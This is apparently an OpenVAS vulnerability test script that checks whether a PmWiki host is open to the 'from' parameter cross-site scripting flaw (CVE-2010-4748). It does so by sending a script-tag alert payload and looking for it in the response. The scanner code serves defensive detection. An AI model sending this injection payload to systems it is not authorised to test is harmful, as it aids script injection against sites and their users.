##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pmwiki_from_xss_vuln.nasl 8495 2018-01-23 07:57:49Z teissa $
#
# PmWiki 'from' Cross-Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML
  and script code in a user's browser session in the context of an affected
  site.
  Impact Level: Application.";
tag_affected = "PmWiki version 2.2.20 and prior";
tag_insight = "Input passed to the 'from' parameter to 'pmwiki.php' is not properly
  sanitised before being returned to the user.";
tag_solution = "Update to PmWiki version 2.2.21 or later
  For updates refer to http://www.pmwiki.org/pub/pmwiki/";
tag_summary = "This host is running PmWiki and is prone to Cross Site
  Scripting vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801700");
  script_version("$Revision: 8495 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-23 08:57:49 +0100 (Tue, 23 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-12-29 07:31:27 +0100 (Wed, 29 Dec 2010)");
  script_cve_id("CVE-2010-4748");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("PmWiki 'from' Cross-Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/42608/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/96687/pm-wiki-xss.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_pmwiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

pwPort = get_http_port(default:80);
if(!pwPort){
  exit(0);
}

## Get PmWiki path from KB
if(!dir = get_dir_from_kb(port:pwPort, app:"PmWiki")){
  exit(0);
}

## Try an exploit
sndReq = http_get(item:string(dir, '/pmwiki.php?n=Main.WikiSandbox?from=' +
                            '<script>alert("OpenVAS-XSS-Testing")</script>'), port:pwPort);
rcvRes = http_keepalive_send_recv(port:pwPort, data:sndReq);

## Check the response to confirm vulnerability
if(rcvRes =~ "HTTP/1\.. 200" && '<script>alert("OpenVAS-XSS-Testing")<' >< rcvRes){
  security_message(pwPort);
}
